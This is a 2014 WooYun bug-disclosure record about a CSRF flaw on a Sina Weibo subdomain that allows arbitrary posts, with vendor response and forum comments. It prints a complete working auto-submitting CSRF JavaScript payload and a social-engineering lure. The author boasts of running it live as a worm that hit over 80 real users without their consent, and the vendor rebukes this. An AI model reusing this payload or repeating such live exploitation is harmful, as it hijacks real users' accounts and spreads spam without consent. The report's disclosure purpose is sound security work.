{"id": 2408, "wybug_id": "wooyun-2014-065761", "wybug_title": "新浪微博CSRF劫持发送任意微博", "wybug_corp": "新浪微博", "wybug_author": "phith0n", "wybug_date": "2014-06-21 19:34", "wybug_open_date": "2014-08-05 19:36", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["蠕虫", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向公众公开  简要描述： 几分钟，刷了不少微博~影响很大！感谢 @z7y 表哥帮我测试~ 详细说明：  新浪微博某分站对发表微博验证不严，导致可以CSRF发表微博。方法是向 http://ka.weibo.com/index.php/request/send/9392 POST数据status=test，即可发送一条微博，内容是test。我在这里写好了一个脚本，只要放在流量大的网站上，很快就能发送很多。然后我在里面加了个@phithon，这样每当受害者发送一次微博的时候，就会@我，我就能看到很多很多受影响的微博用户。用户访问如下页面：http://www.leavesongs.com/other/weibo.html就会中招。以下是CSRF脚本：\ngum=function(){var b={version:\"1140213\",domain:\"{{domain}}\",backinfo:{},e:function(a){try{return eval(a)}catch(b){return\"\"}},jquery:function(){return b.e(\"$().jquery\")?1:0},id:function(a){return b.jquery()?$(\"#\"+a):document.getElementById(a)},name:function(a){return document.getElementsByTagName(a)},html:function(){return b.name(\"html\")[0]||document.write(\"<html>\")||b.name(\"html\")[0]},rdm:function(){return 1E5*Math.random()},bind:function(a,c,e){b.jquery()?$(a).bind(c,e):a.addEventListener?a.addEventListener(c,e,!1):a.attachEvent(\"on\"+c,e)},kill:function(a){b.jquery()?$(a).remove():a.parentElement.removeChild(a)},addom:function(a,c,e,d){!c&&(c=b.html());var f=document.createElement(\"span\");f.innerHTML=a;a=f.children[0];e&&(a.style.display=\"none\");d&&b.bind(a,\"load\",d);c.appendChild(a);return a},script:function(a,c){b.jquery()?$.getScript(a,c):(document.documentElement.appendChild(scripts=document.createElement(\"script\")).src=a,c&&b.bind(scripts,\"load\",c),b.kill(scripts))},ajax:function(a,c,e){var d;c?types=\"POST\":types=\"GET\";b.jquery()?d=$.ajax({type:types,url:a,data:c,success:e}):(d=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject(\"Microsoft.XMLHTTP\"),d.open(types,a,!1),\"POST\"==types&&d.setRequestHeader(\"content-type\",\"application/x-www-form-urlencoded\"),e&&(d.onreadystatechange=function(){4==this.readyState&&(200<=this.status&&300>=this.status||304==this.status)&&e.apply(this,arguments)}),d.send(c));return d},post:function(a,c,e,d){var f=b.addom(\"<form method='POST'>\",b.html(),!0);f.action=a;for(var g in c)a=document.createElement(\"input\"),a.name=g,a.value=c[g],f.appendChild(a);if(!e){var h=b.addom(\"<iframe sandbox name=_\"+b.rdm()+\"_>\",b.html(),!0);f.target=h.name}d&&b.bind(f,\"submit\",d);f.submit();!e&&b.kill(f)&setTimeout(function(){b.kill(h)},3E3)}};return b}();gum.post('http://ka.weibo.com/index.php/request/send/9392', {    'status': '测试微博 by @phithon'});\n   漏洞证明：  z7y表哥帮我测试了一下，发送了一条微博：\n@phithon http://t.cn/RvlqyJw 腾讯LOL活动大礼,上百款皮肤随便抽,不拿白不拿！@z7y_\n用诱惑性的语句诱导用户点击我们的链接，链接中嵌入js，这样就能让用户不知不觉中发送同上的一条微博。再次通过受害者的微博传播，然后受害的用户就会成倍增长，最后达到可怕的数目。我们只测试了十几分钟，就有80多个用户中招了，后来就把页面关了。受害用户如下：\n\n如果我发的是广告或不好的页面，影响极坏。求加精呀~~嘿嘿，也算CSRF蠕虫了吧？   修复方案：  验证。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-21 22:06 厂商回复： 在分析漏洞时，请不要有攻击破坏他人微博的行为，以免有用户投诉或者违法。感谢关注新浪安全。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-21 19:38 |    \t\t我是小号 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:51        | Martin)\t\t \n  顶，很牛百    \n     2014-06-21 19:48 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  师傅 再次首页，    \n     2014-06-21 19:52 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  妈蛋，你又找我的7狗做测试    \n     2014-06-21 19:57 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @寂寞的瘦子 7狗是我的！！    \n     2014-06-21 20:40 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  最近csrf很火啊    \n     2014-06-21 21:51 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @phith0n 7狗是我的！！！    \n     2014-06-21 22:15 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @新浪微博这不是为了证明危害性吗。。给这点rank。。刷粉的洞我就不在乌云交了。。。    \n     2014-06-21 22:24 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @phith0n 你发的啥内容啊。。厂商这么大的回应。。刷粉的洞还是发到乌云让我们这种小菜学习一下吧。。    \n     2014-06-21 22:30 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @小怿 发的个蠕虫，稍微蠕动了十来分钟而已，我就关了。那个不发了。    \n     2014-06-21 22:43 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n   师傅 还是继续通用走起吧，    \n     2014-06-22 05:12 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @′  雨。 phith0n不教我，你做我师傅吧^_^土豪神马的，做师傅最合适了    \n     2014-06-22 09:13 |    \t\t鬼见愁 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 挖洞之神)\t\t \n  没有详细步骤    \n     2014-06-22 09:45 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @mramydnei M老师 Phithon也不教我。 一直想请教请教你xss的  o(∩_∩)o 。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}